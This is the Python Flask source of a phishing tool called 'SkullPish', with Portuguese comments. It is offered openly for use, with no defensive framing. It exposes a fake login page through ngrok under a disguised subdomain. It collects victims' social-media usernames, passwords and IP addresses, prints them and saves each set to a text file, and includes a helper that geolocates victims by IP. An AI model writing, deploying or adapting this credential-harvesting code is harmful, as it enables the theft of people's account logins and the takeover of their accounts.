from flask import Flask, render_template, request, jsonify
import requests
import os

app = Flask(__name__)

# Função para exibir o banner
def display_banner():
    print("*******************************")
    print("*                             *")
    print("*          SkullPish          *")
    print("*                             *")
    print("*******************************")

# Função para obter a URL desejada para o ngrok
def get_ngrok_url():
    return input("Digite a URL para disfarçar o link do ngrok: ")

# Função para obter a porta para rodar o ngrok
def get_ngrok_port():
    return int(input("Digite a porta para rodar o ngrok: "))

# Função para obter o arquivo a ser usado
def get_file_name():
    return input("Digite o nome do arquivo a ser usado (ex: index.html): ")

# Função para obter o IP do usuário
def get_user_ip():
    return request.remote_addr

# Função para obter latitude e longitude usando o IP do usuário
def get_lat_lon(ip):
    url = f'https://freegeoip.app/json/{ip}'
    response = requests.get(url)
    data = response.json()
    latitude = data.get('latitude', 'N/A')
    longitude = data.get('longitude', 'N/A')
    return latitude, longitude

# Rota inicial para exibir o formulário
@app.route('/')
def index():
    return render_template('index.html')  # Renderiza o arquivo HTML

# Rota para obter a localização do usuário (IP)
@app.route('/get_location', methods=['GET'])
def get_location():
    user_ip = get_user_ip()
    return jsonify({"ip": user_ip})

# Rota para submissão do formulário
@app.route('/submit_info', methods=['POST'])
def submit_info():
    data = request.get_json()
    user_ip = data.get('ip')
    user = data.get('user')
    password = data.get('password')
    social_media = data.get('socialMedia')

    # Exibir informações
    print("Informações Detectadas:")
    print(f"IP: {user_ip}")
    print(f"User: {user}")
    print(f"Pass: {password}")
    print(f"Rede Social: {social_media}")

    # Salvar informações em um arquivo com o nome de usuário
    filename = f"{user}.txt"
    with open(filename, 'w') as file:
        file.write("Informações Salvas no Arquivo:\n")
        file.write(f"IP: {user_ip}\n")
        file.write(f"User: {user}\n")
        file.write(f"Pass: {password}\n")
        file.write(f"Rede social: {social_media}\n")

    # Retornar mensagem de sucesso
    return jsonify({"message": "Informações recebidas com sucesso!"})

if __name__ == '__main__':
    display_banner()
    site_name = get_ngrok_url()
    port = get_ngrok_port()
    file_name = get_file_name()

    # Expor o servidor usando Ngrok
    os.system(f'ngrok http -subdomain={site_name} {port}')

    # Iniciar o servidor Flask
    app.run(host='0.0.0.0', port=port)